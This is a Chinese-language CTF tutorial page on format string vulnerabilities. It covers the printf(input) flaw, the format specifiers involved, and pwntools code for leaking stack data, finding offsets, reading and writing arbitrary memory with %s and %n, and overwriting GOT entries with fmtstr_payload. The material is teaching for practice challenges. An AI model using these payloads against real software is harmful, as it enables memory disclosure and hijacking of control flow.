---
title: 格式化字符串漏洞
order: 4
icon: mdi:format-text
category:
  - CTF
  - 手册
  - Pwn
---

格式化字符串漏洞是 Pwn 方向第二常见的漏洞，危害极大——既能**任意读内存**，又能**任意写内存**。

## 漏洞原理

```c
// 安全写法
printf("%s", input);

// 漏洞写法
printf(input);   // 直接把用户输入当格式字符串
```

当 `input = "%p %p %p"` 时，`printf` 会把栈上的数据当作参数打印出来。

## 格式化字符串速查

| 格式符 | 含义 |
|--------|------|
| `%p` | 打印指针（十六进制地址） |
| `%d` | 打印整数 |
| `%s` | 把参数当指针，打印指向的字符串 |
| `%n` | 把已打印的字符数写入参数指向的地址 |
| `%x` | 打印十六进制 |
| `%7$p` | 打印第 7 个参数（直接定位） |

## 泄露栈数据

```python
from pwn import *

p = process('./vuln')

# 逐个打印栈上的值，找有用的地址
payload = b'%p ' * 20
p.sendline(payload)
print(p.recvline())
# 输出类似：0x7fff... 0x400... 0x0 ...
```

### 找偏移量

```python
# 发送特征字符串，找它在第几个参数位置
payload = b'AAAA' + b'.%p' * 20
p.sendline(payload)
# 在输出里找 0x41414141（AAAA 的十六进制）
# 假设在第 6 个位置，那偏移量就是 6
```

## 任意地址读

```python
# 读取 addr 处的字符串
# 格式：[地址][填充] + %偏移$s
addr = 0x601060   # 要读的地址
offset = 6        # 格式字符串在栈上的偏移

payload = p64(addr) + b'%6$s'
p.sendline(payload)
```

## 任意地址写（%n）

`%n` 把"已打印的字符数"写入对应参数指向的地址。

```python
# 把值 100 写入 addr
# 方法：先打印 100 个字符，然后用 %n 写入

addr = 0x601060   # 要写的地址
value = 100       # 要写的值
offset = 6        # 偏移量

payload = p64(addr)
payload += f'%{value - 8}c'.encode()  # 8 是地址本身占的字节
payload += f'%{offset}$n'.encode()
```

### 用 pwntools fmtstr_payload 自动生成

```python
from pwn import *

# 自动生成格式化字符串 payload
# 把 got['puts'] 改写为 win 函数地址
payload = fmtstr_payload(
    offset=6,
    writes={elf.got['puts']: elf.symbols['win']}
)
p.sendline(payload)
```

## 完整利用流程

1. **确认漏洞**：输入 `%p.%p.%p`，看是否打印出地址
2. **找偏移量**：输入 `AAAA.%p.%p...`，找 `0x41414141` 的位置
3. **泄露地址**：用 `%p` 泄露 libc 地址或 canary
4. **任意写**：用 `fmtstr_payload` 改写 GOT 表，劫持控制流

## 课后练习

- [格式化字符串的秘密](http://172.16.173.140/training/11?challenge=50) — `printf(buf)` 格式化字符串漏洞，读取栈上内容并改写全局变量

## 练手资源

- CTFHub 格式化字符串技能树
- 攻防世界 Pwn 中级题（fmt 系列）
